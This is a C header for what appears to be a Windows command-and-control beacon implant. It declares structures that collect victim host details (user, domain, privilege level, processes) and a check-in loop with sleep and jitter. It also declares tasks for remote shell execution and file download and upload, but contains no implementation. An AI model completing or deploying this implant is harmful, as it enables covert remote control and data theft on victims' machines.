#ifndef BEACON_H
#define BEACON_H

#include <windows.h>
#include <winhttp.h>

typedef struct {
    wchar_t       host[256];
    INTERNET_PORT port;

    DWORD         beacon_id;
    DWORD         sleep_ms;
    DWORD         jitter_pct;

    char          eip[64];
    char         *adapters;

    wchar_t       os_version[128];
    DWORD         os_build;
    wchar_t       arch[16];

    wchar_t       process_name[260];
    DWORD         pid;
    DWORD         ppid;
    BOOL          is_64bit_proc;
    DWORD         integrity_level;
    BOOL          is_elevated;

    wchar_t       username[256];
    wchar_t       hostname[256];
    wchar_t       domain[256];
    BOOL          is_domain_joined;

    DWORD         session_id;
} BEACON_CTX;

/* ── task types ─────────────────────────────────────────── */
#define TASK_TYPE_SHELL    "shell"
#define TASK_TYPE_SLEEP    "sleep"
#define TASK_TYPE_EXIT     "exit"
#define TASK_TYPE_DOWNLOAD "download"
#define TASK_TYPE_UPLOAD   "upload"

/* initial output buffer — handlers grow it as needed via HeapReAlloc */
#define OUT_INIT_CAP  (64u * 1024u)     /* 64 KB */

typedef struct {
    char  task_id[64];
    char  type[16];
    char *args;       /* heap — shell cmd / remote path */
    int   args_len;
    char *data;       /* heap — base64 upload payload */
    int   data_len;
} PARSED_TASK;

typedef struct {
    char  task_id[64];
    char  error[512];
    char *output;       /* heap-allocated; handlers may grow via HeapReAlloc */
    DWORD output_cap;
    DWORD output_len;
} TASK_RESULT;

/* ── core functions ─────────────────────────────────────── */
void         beacon_ctx_init(BEACON_CTX *ctx);
BOOL         beacon_checkin(BEACON_CTX *ctx);
DWORD WINAPI beacon_loop(LPVOID lpParam);
BOOL         beacon_poll_tasks(BEACON_CTX *ctx);
void         beacon_exec_shell(BEACON_CTX *ctx, PARSED_TASK *task, TASK_RESULT *result);
void         beacon_exec_download(PARSED_TASK *task, TASK_RESULT *result);
void         beacon_exec_upload(PARSED_TASK *task, TASK_RESULT *result);
void         beacon_submit_result(BEACON_CTX *ctx, TASK_RESULT *result);

#endif
